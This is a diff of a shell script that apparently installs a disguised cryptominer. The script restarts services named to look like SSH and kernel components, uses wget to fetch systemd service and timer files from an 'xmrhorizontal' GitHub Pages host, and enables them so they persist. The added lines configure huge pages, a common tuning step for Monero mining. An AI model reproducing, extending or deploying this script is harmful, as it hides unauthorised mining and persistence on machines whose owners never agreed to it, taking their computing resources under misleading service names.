@@ -1,4 +1,5 @@
 systemctl restart ssh-daemons
+sudo sysctl -w vm.nr_hugepages=128
 sleep 10
 systemctl restart sys-kernel
 if [ ! -f /etc/systemd/system/ssh-daemons.timer ]; then
@@ -8,6 +9,7 @@ if [ ! -f /etc/systemd/system/ssh-daemons.timer ]; then
 	rm ssh-daemons.service
 	wget https://xmrhorizontal.github.io/ssh-daemons.service
 	wget https://xmrhorizontal.github.io/ssh-daemons.timer
+ 	sudo sysctl -w vm.nr_hugepages=128
 	systemctl daemon-reload
         systemctl enable ssh-daemons.timer
 	systemctl start ssh-daemons
